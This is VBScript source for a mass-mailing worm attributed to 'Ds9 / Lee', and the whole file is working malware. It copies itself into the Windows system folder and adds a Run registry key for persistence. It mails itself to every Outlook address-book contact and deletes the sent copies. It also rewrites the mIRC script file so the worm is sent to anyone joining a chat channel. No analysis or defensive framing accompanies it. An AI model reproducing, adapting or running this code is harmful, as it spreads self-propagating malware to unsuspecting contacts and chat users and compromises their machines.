'Worm Created by Ds9 --> Lee
On Error Resume Next
Set hvgmtktmobv = CreateObject("WScript.Shell")
set ywqawrydvuo=createobject("scripting.filesystemobject")
ywqawrydvuo.copyfile wscript.scriptfullname,ywqawrydvuo.GetSpecialFolder(1)& "\Ds9.vbs"
hvgmtktmobv.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Lee","wscript.exe "&ywqawrydvuo.GetSpecialFolder(1)& "\Ds9.vbs %"
if hvgmtktmobv.regread ("HKCU\software\Ds9\mailed") <> "1" then
uqaykuhkiop()
end if
if hvgmtktmobv.regread ("HKCU\software\Ds9\mirqued") <> "1" then
xhinspemvfp()
end if
Function uqaykuhkiop()
On Error Resume Next
Set mhwbbadvsvl = CreateObject("Outlook.Application")
If mhwbbadvsvl= "Outlook"Then
Set rrzbcyksogx=mhwbbadvsvl.GetNameSpace("MAPI")
For Each yjxzglwdwpd In rrzbcyksogx.AddressLists
If yjxzglwdwpd.AddressEntries.Count <> 0 Then
For oocsbuwjwcz= 1 To yjxzglwdwpd.AddressEntries.Count
Set igsdpljpxfq = yjxzglwdwpd.AddressEntries(oocsbuwjwcz)
Set joaxmndnqup = mhwbbadvsvl.CreateItem(0)
joaxmndnqup.To = igsdpljpxfq.Address
joaxmndnqup.Subject = "Hi check This..."
joaxmndnqup.Body = "Hello..your Game is Over..By Q from Lee" & vbcrlf & ""
joaxmndnqup.Attachments.Add ywqawrydvuo.GetSpecialFolder(1)& "\Ds9.vbs"
joaxmndnqup.DeleteAfterSubmit = True
If joaxmndnqup.To <> "" Then
joaxmndnqup.Send
End If
Next
End If
Next
hvgmtktmobv.regwrite "HKCU\software\Ds9\mailed", "1"
end if
End Function
Function xhinspemvfp
On Error Resume Next
if ywqawrydvuo.fileexists("c:\mirc\mirc.ini") then MircLoc="c:\mirc"
if ywqawrydvuo.fileexists("c:\mirc32\mirc.ini") then MircLoc="c:\mirc"
Programfilesdir=hvgmtktmobv.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if ywqawrydvuo.fileexists(Programfilesdir & "\mirc.ini") then MircLoc=Programfilesdir & "\mirc"
set txyxzloshon = ywqawrydvuo.CreateTextFile(MircLoc & "\script.ini", True)
txyxzloshon.writeline "n0=on 1:JOIN:#:{"
txyxzloshon.writeline "n1=  /if ( $nick == $me ) { halt }"
txyxzloshon.writeline "n2=  /.dcc send $nick C:\WINDOWS\SYSTEM\Ds9.vbs"
txyxzloshon.writeline "n3=}"
txyxzloshon.close
hvgmtktmobv.regwrite "HKCU\software\Ds9\Mirqued", "1"
end function
